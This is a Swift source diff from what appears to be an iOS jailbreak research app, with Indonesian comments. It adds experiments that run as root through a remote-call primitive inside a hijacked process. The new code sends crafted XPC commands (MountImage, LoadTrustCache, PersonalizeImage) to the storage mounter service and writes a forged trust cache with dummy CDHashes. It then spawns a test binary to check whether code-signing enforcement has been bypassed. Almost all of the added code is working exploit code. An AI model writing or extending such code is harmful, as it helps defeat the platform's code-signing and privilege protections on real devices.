@@ -950,6 +950,56 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "⑨a MSM MountImage Debug (Exp 111A)",
+                    icon: "externaldrive.fill",
+                    color: .orange,
+                    label: "111A",
+                    action: { runSBExperiment(label: "111A", exp: expMSM111A) },
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "⑨b MSM ImageTrustCache (Exp 111B)",
+                    icon: "doc.badge.plus",
+                    color: .orange,
+                    label: "111B",
+                    action: { runSBExperiment(label: "111B", exp: expMSM111B) },
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "⑨c MSM TC File Path (Exp 111C)",
+                    icon: "folder.badge.plus",
+                    color: .orange,
+                    label: "111C",
+                    action: { runSBExperiment(label: "111C", exp: expMSM111C) },
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "⑨d MSM Personalize Debug (Exp 111D)",
+                    icon: "person.badge.key.fill",
+                    color: .orange,
+                    label: "111D",
+                    action: { runSBExperiment(label: "111D", exp: expMSM111D) },
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "⑩ TC Load + Spawn Test (Exp 112)",
+                    icon: "bolt.circle.fill",
+                    color: .green,
+                    label: "TC+Spawn",
+                    action: runExp112TCLoadSpawn,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -5524,6 +5574,248 @@ struct AMFIExperimentView: View {
         detail += "Jika respring = salah satu attempt trigger bug di MSM\n"
 
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+    }
+    #endif
+
+    // MARK: - Exp 111A-D: Split MSM attempts + Exp 112
+
+    #if !DISABLE_REMOTECALL
+
+    /// Helper: connect MSM + create dict + set Command
+    private func msmConnect(_ sb: RemoteCall) -> (conn: UInt64, xpcDictCreate: UInt64, xpcSetStr: UInt64, xpcSetData: UInt64, xpcSend: UInt64)? {
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_dictionary_create"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_dictionary_set_data"))
+        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "xpc_connection_send_message"))
+        guard xpcCreate != 0 && xpcDictCreate != 0 else { return nil }
+        let svc = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
+        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svc, 0, 0)
+        RootExecutor.rcall(sb, "free", svc)
+        guard conn != 0 else { return nil }
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        return (conn, xpcDictCreate, xpcSetStr, xpcSetData, xpcSend)
+    }
+
+    private func msmSendDict(_ sb: RemoteCall, conn: UInt64, create: UInt64, setStr: UInt64, send: UInt64, pairs: [(String, String)]) {
+        let msg = RootExecutor.rcallAddr(sb, create, 0, 0, 0)
+        guard msg != 0 else { return }
+        for (k, v) in pairs {
+            let ka = remote_alloc_str(sb, k)
+            let va = remote_alloc_str(sb, v)
+            RootExecutor.rcallAddr(sb, setStr, msg, ka, va)
+            RootExecutor.rcall(sb, "free", ka)
+            RootExecutor.rcall(sb, "free", va)
+        }
+        RootExecutor.rcallAddr(sb, send, conn, msg)
+    }
+
+    /// 111A: HANYA MountImage debug path
+    private func expMSM111A(sb: RemoteCall) -> ExperimentResult {
+        var detail = "Exp 111A: MountImage debug path ONLY\n\n"
+        guard let msm = msmConnect(sb) else {
+            return ExperimentResult(name: "111A MountImage", success: false, detail: "MSM connect failed", timestamp: Date())
+        }
+        // Write .TrustCache dulu
+        let sem = DispatchSemaphore(value: 0)
+        root.executeAsRoot(operation: "111a_write") { rc in
+            let dir = remote_alloc_str(rc, "/private/var/personalized_debug")
+            RootExecutor.rcall(rc, "mkdir", dir, 0o755)
+            RootExecutor.rcall(rc, "free", dir)
+            let f = remote_alloc_str(rc, "/private/var/personalized_debug/.TrustCache")
+            RootExecutor.rcall(rc, "unlink", f)
+            let fd = RootExecutor.rcall(rc, "open", f, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+            if fd != UInt64(bitPattern: -1) {
+                let b = rc.trojanMem + 0x800
+                rc[b+0].setValue32(2); rc[b+4].setValue64(0xDEAD1337); rc[b+12].setValue64(0xBEEF0002)
+                rc[b+20].setValue32(1); rc[b+24].setValue64(0x4141414141414141)
+                rc[b+32].setValue64(0x4141414141414141); rc[b+40].setValue32(0x00024141)
+                RootExecutor.rcall(rc, "write", fd, b, 48)
+                RootExecutor.rcall(rc, "close", fd)
+            }
+            RootExecutor.rcall(rc, "free", f)
+            sem.signal()
+            return (true, "", 0)
+        }
+        sem.wait()
+
+        msmSendDict(sb, conn: msm.conn, create: msm.xpcDictCreate, setStr: msm.xpcSetStr, send: msm.xpcSend, pairs: [
+            ("Command", "MountImage"),
+            ("ImagePath", "/private/var/personalized_debug"),
+            ("ImageType", "Developer"),
+        ])
+        detail += "✅ Sent MountImage(path=/private/var/personalized_debug)\n"
+        detail += "Kalau respring = MountImage yang trigger!\n"
+        return ExperimentResult(name: "111A MountImage", success: true, detail: detail, timestamp: Date())
+    }
+
+    /// 111B: HANYA LoadTrustCache + ImageTrustCache data
+    private func expMSM111B(sb: RemoteCall) -> ExperimentResult {
+        var detail = "Exp 111B: LoadTrustCache + ImageTrustCache ONLY\n\n"
+        guard let msm = msmConnect(sb) else {
+            return ExperimentResult(name: "111B ImageTC", success: false, detail: "MSM connect failed", timestamp: Date())
+        }
+        let msg = RootExecutor.rcallAddr(sb, msm.xpcDictCreate, 0, 0, 0)
+        guard msg != 0 else {
+            return ExperimentResult(name: "111B ImageTC", success: false, detail: "dict create failed", timestamp: Date())
+        }
+        // Command + ImageType
+        for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
+            let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
+            RootExecutor.rcallAddr(sb, msm.xpcSetStr, msg, ka, va)
+            RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
+        }
+        // ImageTrustCache = raw 48 bytes
+        let tcBuf = sb.trojanMem + 0x800
+        sb[tcBuf+0].setValue32(2); sb[tcBuf+4].setValue64(0xDEAD1337)
+        sb[tcBuf+12].setValue64(0xBEEF0002); sb[tcBuf+20].setValue32(1)
+        sb[tcBuf+24].setValue64(0x4141414141414141)
+        sb[tcBuf+32].setValue64(0x4141414141414141); sb[tcBuf+40].setValue32(0x00024141)
+        let kTC = remote_alloc_str(sb, "ImageTrustCache")
+        RootExecutor.rcallAddr(sb, msm.xpcSetData, msg, kTC, tcBuf, 48)
+        RootExecutor.rcall(sb, "free", kTC)
+        RootExecutor.rcallAddr(sb, msm.xpcSend, msm.conn, msg)
+        detail += "✅ Sent LoadTrustCache + ImageTrustCache(48B)\n"
+        detail += "Kalau respring = ImageTrustCache yang trigger!\n"
+        return ExperimentResult(name: "111B ImageTC", success: true, detail: detail, timestamp: Date())
+    }
+
+    /// 111C: HANYA LoadTrustCache + file path
+    private func expMSM111C(sb: RemoteCall) -> ExperimentResult {
+        var detail = "Exp 111C: LoadTrustCache + file path ONLY\n\n"
+        guard let msm = msmConnect(sb) else {
+            return ExperimentResult(name: "111C FilePath", success: false, detail: "MSM connect failed", timestamp: Date())
+        }
+        msmSendDict(sb, conn: msm.conn, create: msm.xpcDictCreate, setStr: msm.xpcSetStr, send: msm.xpcSend, pairs: [
+            ("Command", "LoadTrustCache"),
+            ("ImagePath", "/private/var/personalized_debug"),
+            ("ImageType", "Developer"),
+        ])
+        detail += "✅ Sent LoadTrustCache(path=personalized_debug)\n"
+        detail += "Kalau respring = file path LoadTrustCache yang trigger!\n"
+        return ExperimentResult(name: "111C FilePath", success: true, detail: detail, timestamp: Date())
+    }
+
+    /// 111D: HANYA PersonalizeImage debug
+    private func expMSM111D(sb: RemoteCall) -> ExperimentResult {
+        var detail = "Exp 111D: PersonalizeImage debug ONLY\n\n"
+        guard let msm = msmConnect(sb) else {
+            return ExperimentResult(name: "111D Personalize", success: false, detail: "MSM connect failed", timestamp: Date())
+        }
+        msmSendDict(sb, conn: msm.conn, create: msm.xpcDictCreate, setStr: msm.xpcSetStr, send: msm.xpcSend, pairs: [
+            ("Command", "PersonalizeImage"),
+            ("ImagePath", "/private/var/personalized_debug"),
+            ("ImageType", "Developer"),
+            ("PersonalizedImageType", "debug"),
+        ])
+        detail += "✅ Sent PersonalizeImage(type=debug)\n"
+        detail += "Kalau respring = PersonalizeImage yang trigger!\n"
+        return ExperimentResult(name: "111D Personalize", success: true, detail: detail, timestamp: Date())
+    }
+
+    #endif
+
+    // MARK: - Exp 112: TC Load + Immediate Spawn Test
+
+    private func runExp112TCLoadSpawn() {
+        isRunning = true
+        runningLabel = "TC+Spawn"
+        #if !DISABLE_REMOTECALL
+        guard let sb = dspmgr.shared.sbProc, mgr.rcready else {
+            results.insert(ExperimentResult(name: "TC+Spawn (Exp 112)", success: false,
+                detail: "No RC", timestamp: Date()), at: 0)
+            isRunning = false; runningLabel = ""; return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expTCLoadSpawn(sb: sb)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false; self.runningLabel = ""
+            }
+        }
+        #else
+        isRunning = false; runningLabel = ""
+        #endif
+    }
+
+    #if !DISABLE_REMOTECALL
+    /// Exp 112: Load TC via MSM lalu LANGSUNG spawn test
+    /// Jika TC loaded = spawn binary tanpa SIGKILL = JAILBREAK!
+    private func expTCLoadSpawn(sb: RemoteCall) -> ExperimentResult {
+        let expName = "TC+Spawn (Exp 112)"
+        var detail = "Experiment 112: Load TC → Immediate Spawn\n"
+        detail += "============================================\n\n"
+
+        // Step 1: Send LoadTrustCache ke MSM (pakai ImageTrustCache)
+        detail += "=== Step 1: LoadTrustCache via MSM ===\n"
+        guard let msm = msmConnect(sb) else {
+            detail += "❌ MSM connect failed\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let msg = RootExecutor.rcallAddr(sb, msm.xpcDictCreate, 0, 0, 0)
+        guard msg != 0 else {
+            detail += "❌ dict create failed\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
+            let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
+            RootExecutor.rcallAddr(sb, msm.xpcSetStr, msg, ka, va)
+            RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
+        }
+
+        // TC dengan CDHash dummy
+        let tcBuf = sb.trojanMem + 0x800
+        sb[tcBuf+0].setValue32(2); sb[tcBuf+4].setValue64(0xDEAD1337)
+        sb[tcBuf+12].setValue64(0xBEEF0002); sb[tcBuf+20].setValue32(1)
+        sb[tcBuf+24].setValue64(0x4141414141414141)
+        sb[tcBuf+32].setValue64(0x4141414141414141); sb[tcBuf+40].setValue32(0x00024141)
+        let kTC = remote_alloc_str(sb, "ImageTrustCache")
+        RootExecutor.rcallAddr(sb, msm.xpcSetData, msg, kTC, tcBuf, 48)
+        RootExecutor.rcall(sb, "free", kTC)
+        RootExecutor.rcallAddr(sb, msm.xpcSend, msm.conn, msg)
+        detail += "✅ LoadTrustCache sent\n"
+
+        // Step 2: Spawn test via launchd
+        detail += "\n=== Step 2: Spawn Test ===\n"
+
+        var spawnRet: Int64 = -1
+        var spawnPid: UInt32 = 0
+        var spawnSig: Int32 = -1
+
+        let sem = DispatchSemaphore(value: 0)
+        root.executeAsRoot(operation: "exp112_spawn") { rc in
+            let mem = rc.trojanMem
+            let (ret, pid, _) = self.doSpawn(rc: rc, path: "/usr/bin/id", mem: mem)
+            spawnRet = ret
+            spawnPid = pid
+            if ret == 0 && pid != 0 {
+                let (sig, _) = self.doWait(rc: rc, pid: pid, mem: mem)
+                spawnSig = sig
+            }
+            sem.signal()
+            return (true, "spawn", 0)
+        }
+        sem.wait()
+
+        detail += "posix_spawn(/usr/bin/id): ret=\(spawnRet), pid=\(spawnPid)\n"
+        if spawnRet == 0 && spawnPid != 0 {
+            detail += "exit signal: \(spawnSig)\n"
+            if spawnSig != 9 {
+                detail += "\n🎉🎉🎉 NO SIGKILL! TRUST CACHE LOADED! 🎉🎉🎉\n"
+                detail += "FULL JAILBREAK ACHIEVED!\n"
+            } else {
+                detail += "\nSIGKILL — TC belum loaded (MSM reject silently)\n"
+                detail += "Perlu: valid IMG4 signature atau exploit MSM validation\n"
+            }
+        } else {
+            detail += "Spawn failed (ret=\(spawnRet))\n"
+        }
+
+        return ExperimentResult(name: expName, success: spawnSig != 9 && spawnPid != 0, detail: detail, timestamp: Date())
     }
     #endif
 
